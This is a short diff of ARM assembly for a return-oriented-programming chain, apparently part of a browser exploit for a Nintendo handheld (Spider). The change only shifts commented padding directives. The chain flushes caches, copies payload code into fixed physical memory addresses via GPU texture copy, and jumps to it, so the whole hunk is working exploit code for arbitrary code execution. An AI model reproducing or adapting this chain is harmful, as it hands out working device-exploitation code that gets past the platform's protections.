@@ -17,25 +17,25 @@ _start:
 	rop_flush_data_cache(BUFFER_LOC, SPIDER_ARM_CODE_SIZE)
 	rop_gx_texture_copy(BUFFER_LOC, CODE_TARGET, SPIDER_ARM_CODE_SIZE)
 	rop_sleep(1000000000)
-@.org 0x0F4, GARBAGE
 	.fill 3, 4, POP_PC
 	.word POP_R0_PC
+@.org 0x0F4, GARBAGE
 	.word ROP_LOC+_start+0x8C
-@.org 0x128, GARBAGE
 	.fill 11, 4, POP_PC
 	.word POP_R0_PC
+@.org 0x128, GARBAGE
 	.word ROP_LOC+_start, POP_PC, POP_PC
-@.org 0x158, GARBAGE
 	rop_flush_data_cache(BUFFER_LOC, 0x38400)
 	.fill 2, 4, POP_PC
+@.org 0x158, GARBAGE
 	rop_gx_texture_copy(BUFFER_LOC, 0x1F48F000, SPIDER_ARM_CODE_SIZE)
 	rop_sleep(1000000000)
 	rop_flush_data_cache(BUFFER_LOC, 0x38400)
 	rop_gx_texture_copy(BUFFER_LOC, 0x1F4C7800, SPIDER_ARM_CODE_SIZE)
 	rop_sleep(1000000000)
 	rop_jump_arm
-@.org 0x21C, GARBAGE
 	.fill 8, 4, GARBAGE
+@.org 0x21C, GARBAGE
 	.word MAGIC
 FileName:
 	.string16 "dmc:/"
